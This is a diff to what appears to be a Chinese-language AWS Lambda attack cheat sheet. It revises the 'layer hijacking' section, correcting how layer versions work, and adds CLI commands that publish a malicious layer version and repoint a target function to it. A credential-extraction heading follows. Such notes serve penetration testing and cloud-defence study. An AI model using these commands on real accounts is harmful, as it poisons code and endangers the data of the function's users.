@@ -63,15 +63,20 @@ aws lambda update-function-configuration --function-name FUNC_NAME \
 
 ## Layer 劫持
 
-Lambda Layers 是共享的代码库，修改 Layer 可以影响所有使用它的函数：
+Lambda Layer version 是不可变快照；发布同名 Layer 只会创建新版本，不会自动影响仍绑定旧版本 ARN 的函数。要投毒目标函数，需要发布新 Layer version 后更新函数配置指向该版本。
 
 ```bash
 # 列出函数使用的 Layers
 aws lambda get-function-configuration --function-name FUNC_NAME --query 'Layers'
 
-# 发布恶意 Layer（替换依赖库）
-aws lambda publish-layer-version --layer-name shared-lib \
-  --zip-file fileb://malicious_layer.zip
+# 发布恶意 Layer 新版本（替换依赖库）
+LAYER_ARN=$(aws lambda publish-layer-version --layer-name shared-lib \
+  --zip-file fileb://malicious_layer.zip \
+  --query 'LayerVersionArn' --output text)
+
+# 将目标函数更新到新的 Layer version
+aws lambda update-function-configuration --function-name FUNC_NAME \
+  --layers "$LAYER_ARN"
 ```
 
 ## 临时凭据提取
